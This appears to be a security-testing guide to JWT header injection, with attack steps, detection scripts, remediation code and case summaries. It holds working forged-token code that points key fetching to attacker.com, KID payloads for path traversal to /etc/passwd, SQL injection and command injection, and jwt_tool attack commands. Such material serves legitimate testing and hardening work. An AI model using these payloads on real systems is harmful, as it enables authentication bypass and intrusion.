# JWT Header Parameter Injection

## Attack Description

JWT Header Parameter Injection exploits optional header fields that allow specifying key sources or key identifiers. Attackers can manipulate these parameters to:

1. **JKU (JWK Set URL) Spoofing**: Force the application to fetch keys from attacker-controlled URLs
2. **X5U (X.509 URL) Spoofing**: Redirect certificate validation to malicious X.509 certificate chains  
3. **KID (Key ID) Manipulation**: Exploit key identifier processing for directory traversal, SQL injection, or command injection
4. **JWK Injection**: Embed attacker-controlled keys directly in the token header

These attacks bypass signature verification by controlling the cryptographic material used for validation.

## Prerequisites

- JWT implementation that processes header parameters (`jku`, `x5u`, `kid`, `jwk`)
- Ability to host files on external servers (for JKU/X5U spoofing)
- Understanding of the application's key storage/retrieval mechanism
- Valid JWT token to modify

## Exploitation Steps

### Attack 1: JKU (JWK Set URL) Spoofing

**Step 1: Understand the JKU Parameter**
```bash
# Decode JWT header
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhhbXBsZS5jb20vLndlbGwta25vd24vandrcy5qc29uIn0" | base64 -d
# {"typ":"JWT","alg":"RS256","jku":"https://example.com/.well-known/jwks.json"}
```

**Step 2: Generate Malicious Key Pair**
```bash
# Generate RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -outform PEM -pubout -out attacker_public.pem
```

**Step 3: Create Malicious JWKS File**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-1", 
      "use": "sig",
      "alg": "RS256",
      "n": "base64url_encoded_modulus",
      "e": "AQAB"
    }
  ]
}
```

**Step 4: Host JWKS and Craft Token**
```python
import jwt
import json
from cryptography.hazmat.primitives import serialization

# Host malicious JWKS at https://attacker.com/malicious.jwks

# Load private key
with open('attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

# Create payload
payload = {
    "user": "admin",
    "role": "administrator", 
    "exp": 1699999999
}

# Create header with malicious JKU
headers = {
    "alg": "RS256",
    "typ": "JWT", 
    "jku": "https://attacker.com/malicious.jwks"
}

# Sign token
token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
```

### Attack 2: X5U (X.509 URL) Spoofing

**Step 1: Generate X.509 Certificate**
```bash
# Generate key and self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout attacker_key.pem -out attacker_cert.pem -days 365 -nodes
```

**Step 2: Create Certificate Chain**
```bash
# Convert to PEM format and host
cat attacker_cert.pem > certificate_chain.pem
```

**Step 3: Craft Token with X5U Header**
```python
headers = {
    "alg": "RS256",
    "typ": "JWT",
    "x5u": "https://attacker.com/certificate_chain.pem"
}

token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
```

### Attack 3: KID Parameter Manipulation

**Directory Traversal Attack**
```json
{
  "alg": "HS256",
  "typ": "JWT", 
  "kid": "../../etc/passwd"
}
```

**SQL Injection Attack**  
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "test' UNION SELECT 'secret_key' as key_data --"
}
```

**Command Injection Attack**
```json
{
  "alg": "HS256", 
  "typ": "JWT",
  "kid": "key_file|whoami;ls"
}
```

**Null Byte Attack**
```json
{
  "alg": "HS256",
  "typ": "JWT", 
  "kid": "../../dev/null\u0000"
}
```

### Attack 4: JWK Header Injection

```python
# Embed malicious JWK directly in header
malicious_jwk = {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig", 
    "alg": "RS256",
    "n": "base64url_encoded_modulus",
    "e": "AQAB"
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": malicious_jwk
}

token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers)
```

## Detection Methods

### Manual Testing

**1. Header Parameter Discovery**
```bash
# Check if application accepts header parameters
# Try modifying each parameter and observe responses

# Test JKU parameter
python3 jwt_tool.py <TOKEN> -I -hc jku -hv "https://attacker.com/test.jwks"

# Test X5U parameter  
python3 jwt_tool.py <TOKEN> -I -hc x5u -hv "https://attacker.com/test.pem"

# Test KID parameter
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../etc/passwd"
```

**2. Monitor HTTP Requests**
```bash
# Use Burp Collaborator or ngrok to detect outbound requests
# If JKU/X5U parameters are processed, you'll see HTTP requests to your URLs
```

### Automated Testing

**JWT_tool Comprehensive Testing**
```bash
# Test all header injection attacks
python3 jwt_tool.py <TOKEN> -X s -ju https://attacker.com/malicious.jwks

# Test KID injection
python3 jwt_tool.py <TOKEN> -X i

# Test specific KID payloads
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../../../etc/passwd"
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "test' OR '1'='1"
```

**Custom Testing Script**
```python
import jwt
import requests
import base64
import json

def test_jku_injection(original_token, malicious_url):
    """Test JKU parameter injection"""
    try:
        # Decode token without verification
        decoded = jwt.decode(original_token, options={"verify_signature": False})
        header = jwt.get_unverified_header(original_token)
        
        # Modify header
        header['jku'] = malicious_url
        
        # Re-encode (won't have valid signature)
        malicious_token = jwt.encode(decoded, "dummy", algorithm='none', headers=header)
        
        return malicious_token
    except Exception as e:
        print(f"Error: {e}")
        return None

def test_kid_injection(original_token, kid_payload):
    """Test KID parameter injection"""
    header = jwt.get_unverified_header(original_token)
    decoded = jwt.decode(original_token, options={"verify_signature": False})
    
    header['kid'] = kid_payload
    
    return jwt.encode(decoded, "", algorithm='none', headers=header)
```

## Remediation

### Secure Implementation

**1. Parameter Validation**
```python
import re
from urllib.parse import urlparse

def validate_jku_url(jku_url):
    """Secure JKU validation"""
    if not jku_url:
        return False
        
    # Parse URL
    parsed = urlparse(jku_url)
    
    # Only allow HTTPS
    if parsed.scheme != 'https':
        return False
        
    # Whitelist allowed domains
    allowed_domains = ['trusted-auth.company.com', 'auth.company.com']
    if parsed.hostname not in allowed_domains:
        return False
        
    # Validate path
    if not parsed.path.endswith('.json'):
        return False
        
    return True

def validate_kid(kid):
    """Secure KID validation"""
    if not kid:
        return False
        
    # Only allow alphanumeric characters
    if not re.match(r'^[a-zA-Z0-9_-]+$', kid):
        return False
        
    # Length restrictions
    if len(kid) > 50:
        return False
        
    return True

def secure_jwt_verify(token):
    """Secure JWT verification"""
    try:
        header = jwt.get_unverified_header(token)
        
        # Validate header parameters before processing
        if 'jku' in header and not validate_jku_url(header['jku']):
            raise ValueError("Invalid JKU URL")
            
        if 'kid' in header and not validate_kid(header['kid']):
            raise ValueError("Invalid KID")
            
        # Reject embedded JWK
        if 'jwk' in header:
            raise ValueError("Embedded JWK not allowed")
            
        # Reject X5U unless explicitly needed
        if 'x5u' in header:
            raise ValueError("X5U not allowed")
            
        # Continue with standard verification...
        return jwt.decode(token, get_public_key(header), algorithms=['RS256'])
        
    except Exception as e:
        print(f"Token validation failed: {e}")
        return None
```

**2. Disable Dangerous Parameters**
```python
# Explicitly disable header parameter processing
ALLOWED_HEADER_PARAMS = ['alg', 'typ', 'kid']  # Only allow essential parameters

def strip_dangerous_headers(token):
    """Remove dangerous header parameters"""
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    
    # Keep only safe parameters
    safe_header = {k: v for k, v in header.items() if k in ALLOWED_HEADER_PARAMS}
    
    # Re-encode with safe header
    return jwt.encode(payload, get_signing_key(), algorithm='RS256', headers=safe_header)
```

**3. Static Key Configuration**
```python
# Never fetch keys from token-specified URLs
class StaticKeyProvider:
    def __init__(self):
        self.keys = {
            'key1': load_key_from_file('/secure/path/key1.pem'),
            'key2': load_key_from_file('/secure/path/key2.pem')
        }
    
    def get_key(self, kid):
        """Get key by ID from static configuration"""
        if kid not in self.keys:
            raise ValueError(f"Unknown key ID: {kid}")
        return self.keys[kid]

# Usage
key_provider = StaticKeyProvider()

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header.get('kid', 'default')
    
    # Get key from secure static configuration
    public_key = key_provider.get_key(kid)
    
    return jwt.decode(token, public_key, algorithms=['RS256'])
```

## Real Examples

### Example 1: NodeJS JWT Library (CVE-2018-0114)
- **Vulnerability**: JWK header injection in jose library
- **Impact**: Signature bypass via embedded malicious JWK
- **Exploitation**: Embedded attacker's public key in token header
- **Fix**: Disabled JWK header parameter processing

### Example 2: Auth0 JKU Spoofing
- **Target**: Application trusting any JKU URL
- **Vulnerability**: No domain validation for JKU parameter
- **Exploitation**: Hosted malicious JWKS at attacker.com
- **Impact**: Complete authentication bypass
- **Bounty**: $5,000

### Example 3: KID Directory Traversal (Ruby CVE-2017-17405)
- **Vulnerability**: KID parameter passed to `open()` function
- **Payload**: `"kid": "../../etc/passwd"`
- **Impact**: File disclosure and potential RCE via command injection
- **Root cause**: Difference between `File.open()` and `open()` in Ruby

### Example 4: E-commerce Platform KID SQL Injection
- **Target**: Application retrieving keys from database via KID
- **Payload**: `"kid": "1' UNION SELECT 'known_secret' --"`
- **Impact**: Authentication bypass using predictable key
- **Discovery**: Blind SQL injection through timing attacks

## Tool References

```bash
# JWT_tool (comprehensive header injection testing)
python3 jwt_tool.py <TOKEN> -X s -ju https://attacker.com/jwks.json  # JKU spoofing
python3 jwt_tool.py <TOKEN> -X i                                      # KID injection
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../etc/passwd"        # Specific KID payload

# Burp Extensions
# - JWT Editor (manual header manipulation)
# - JOSEPH (automated header injection testing)

# Custom tools
# - JWK generation: https://mkjwk.org/
# - JWKS hosting: Any web server
# - Certificate generation: OpenSSL
```

## OWASP References
- **OWASP Top 10 2021**: A03 Injection
- **OWASP ASVS**: V5.1 Input Validation
- **CWE-73**: External Control of File Name or Path
- **CWE-89**: SQL Injection  
- **CWE-78**: OS Command Injection